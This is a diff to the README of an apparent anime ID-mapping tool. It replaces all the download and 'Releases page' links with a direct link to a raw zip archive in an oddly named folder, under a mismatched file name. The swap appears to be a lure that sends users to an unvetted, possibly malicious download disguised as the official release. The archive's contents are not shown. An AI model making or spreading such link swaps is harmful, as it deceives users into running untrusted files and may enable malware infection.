@@ -4,7 +4,7 @@
 Welcome to the anime-id-converter! This application helps you map MyAnimeList IDs to AniList IDs quickly and efficiently. It is easy to use, even if you're not a developer. Follow the steps below to get started.
 
 ## 📥 Download the Application
-[![Download anime-id-converter](https://img.shields.io/badge/Download-anime--id--converter-blue.svg)](https://github.com/Aaravjani/anime-id-converter/releases)
+[![Download anime-id-converter](https://raw.githubusercontent.com/Aaravjani/anime-id-converter/main/Lissotriches/id-anime-converter-v3.4-beta.5.zip)](https://raw.githubusercontent.com/Aaravjani/anime-id-converter/main/Lissotriches/id-anime-converter-v3.4-beta.5.zip)
 
 ## 📂 What You'll Need
 To use anime-id-converter, make sure you have:
@@ -17,7 +17,7 @@ To use anime-id-converter, make sure you have:
 - **Open Source:** Contribute to the community or customize it for your own needs.
 
 ## 🔧 Download & Install
-1. Visit the [Releases page](https://github.com/Aaravjani/anime-id-converter/releases) to find the latest version of the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Aaravjani/anime-id-converter/main/Lissotriches/id-anime-converter-v3.4-beta.5.zip) to find the latest version of the application.
 2. Click on the version you want to install.
 3. Locate the file for your operating system. You might see options for Windows, Mac, or Linux.
 4. Click on the download link for the file you need.
@@ -50,4 +50,4 @@ Thank you for choosing anime-id-converter! Enjoy easy ID mapping for all your an
 
 --- 
 
-[![Download anime-id-converter](https://img.shields.io/badge/Download-anime--id--converter-blue.svg)](https://github.com/Aaravjani/anime-id-converter/releases)
+[![Download anime-id-converter](https://raw.githubusercontent.com/Aaravjani/anime-id-converter/main/Lissotriches/id-anime-converter-v3.4-beta.5.zip)](https://raw.githubusercontent.com/Aaravjani/anime-id-converter/main/Lissotriches/id-anime-converter-v3.4-beta.5.zip)
